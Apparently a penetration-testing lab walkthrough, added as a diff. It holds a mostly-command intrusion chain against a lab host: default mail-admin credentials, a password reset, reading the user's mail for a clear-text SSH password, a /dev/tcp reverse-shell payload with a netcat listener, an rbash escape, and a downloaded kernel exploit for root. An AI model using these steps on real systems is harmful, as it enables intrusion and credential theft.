@@ -1,0 +1,84 @@
+nc -nv 10.11.1.72 4555 -C
+
+login root pass root
+
+setpassword ryuu qwerty
+Password for ryuu reset
+
+Harvesting
+
+nc -nvC 10.11.1.72 110
+
+Ncat: Connected to 10.11.1.72:110.
++OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
+user ryuu
++OK
+pass qwerty
++OK Welcome ryuu
+
+LIST
++OK 2 1807
+1 786
+2 1021
+
+RETR 1
++OK Message follows
+Return-Path: <mailadmin@localhost>
+Message-ID: <19262980.2.1420734423735.JavaMail.root@pop3>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: ryuu@localhost
+Received: from localhost ([127.0.0.1])
+          by pop3 (JAMES SMTP Server 2.3.2) with SMTP ID 874
+          for <ryuu@localhost>;
+          Thu, 8 Jan 2015 11:27:01 -0500 (EST)
+Date: Thu, 8 Jan 2015 11:27:01 -0500 (EST)
+From: mailadmin@localhost
+Dear Ryuu,
+
+Here are your ssh credentials to access the system. Remember to reset your password after your first login.
+Your access is restricted at the moment, feel free to ask your supervisor to add any command you need to your path.
+
+username: ryuu
+password: QUHqhUPRKXMo4m7k
+
+Kind regards,
+
+Matt
+.
+
+ssh ryuu@10.11.1.72
+
+echo $SHELL
+/bin/rbash
+
+echo $PATH
+/home/ryuu/usr/bin
+
+
+https://www.exploit-db.com/exploits/35513
+
+payload = "/bin/bash -i >\& /dev/tcp/IP/PORT 0>\&1"
+
+nc -lnvp 4444
+
+python 35513.py 10.11.1.72
+
+ssh ryuu@10.11.1.72
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+privesc :
+
+Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) 
+
+wget http://IP/18411.c
+
+gcc -o exploit 18411.c
+
+./exploit
+
+ryuu@beta:/tmp$ ./exploit
